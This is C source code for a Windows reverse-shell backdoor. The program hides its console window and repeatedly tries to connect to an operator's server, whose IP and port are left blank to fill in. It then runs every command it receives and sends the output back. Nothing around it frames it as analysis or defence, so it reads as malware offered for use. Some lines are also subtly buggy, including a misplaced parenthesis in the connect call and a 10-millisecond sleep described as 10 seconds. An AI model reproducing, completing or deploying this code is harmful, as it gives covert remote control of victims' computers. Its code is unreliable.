#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>
#define bzero(p, size) (void) memset((p), 0, (size))    					//define bzero linux function for windows machine use based on memset

int sock;											//defining socket variable

void Shell(){   										//recieve the commands from the server and send them to the win machine
        char buffer[1024];    									//store the commands
        char container[1024];    								//contain information to be sent to t_response
        char t_response[18384];  								//store total information

        while (1){										//using the shell commands 
                jump:
                bzero(buffer, 1024);
                bzero(container, sizeof(container));
                bzero(t_response, sizeof(t_response));
                recv(sock, buffer, 1024, 0);
                if (strncmp("q", buffer, 1) == 0){     						//create a quit command for closing the connection
                        closesocket(sock);
                        WSACleanup();
                        exit(0);
                }else{
                        FILE *fp;  								//creating a file descriptor
                        fp = _popen(buffer, "r");  						//whatever is stored here, the system shall run it as a process
                        while(fgets(container, 1024, fp) != NULL){    				//putting a string from one variable to another
                                strcat(t_response, container);
                        }
                        send(sock, t_response, sizeof(t_response), 0);  			//send the t_response to the buffer
                        fclose(fp);  								//closing the file descriptor
                }
        }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){      //connect to server
        HWND stealth;  										//defining the variable for the hiding of the cmd
	struct sockaddr_in ServerAddress;   							//defining the server address
        unsigned short ServerPort;    								//defining the server port
        char *ServerIP;   									//defining the server IP
        WSADATA wsaData; 									//contains information about win socket
	
        AllocConsole();										//allocate a cmd for the calling commands from Shell()
        stealth = FindWindowA("ConsoleWindowClass", NULL);					//making the cmd invisible 
        ShowWindow(stealth, 0);    								//0 hides the console in nCmdShow

        ServerIP = "";  									//define the IP Address of your machine
        ServerPort = 0000;  									//define any existent port not being used

        if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){  						//iniates Winsock DLL
                exit(1);
        }
        sock = socket(AF_INET, SOCK_STREAM, 0);   						//estabilishing socket connection by IPV4 and TCP Protocol
        memset(&ServerAddress, 0, sizeof(ServerAddress));  					//clear the variables
        ServerAddress.sin_family = AF_INET;   							//binding the ports with IPV4
        ServerAddress.sin_addr.s_addr = inet_addr(ServerIP);
        ServerAddress.sin_port = htons(ServerPort);

        start:
        while (connect(sock, (struct sockAddr *) &ServerAddress, sizeof(ServerAddress) != 0)); {
                Sleep(10);									//try to estabilish the connection every 10s
                goto start;
        }
        Shell();										//calls upon the shell() function for injection of commands
}
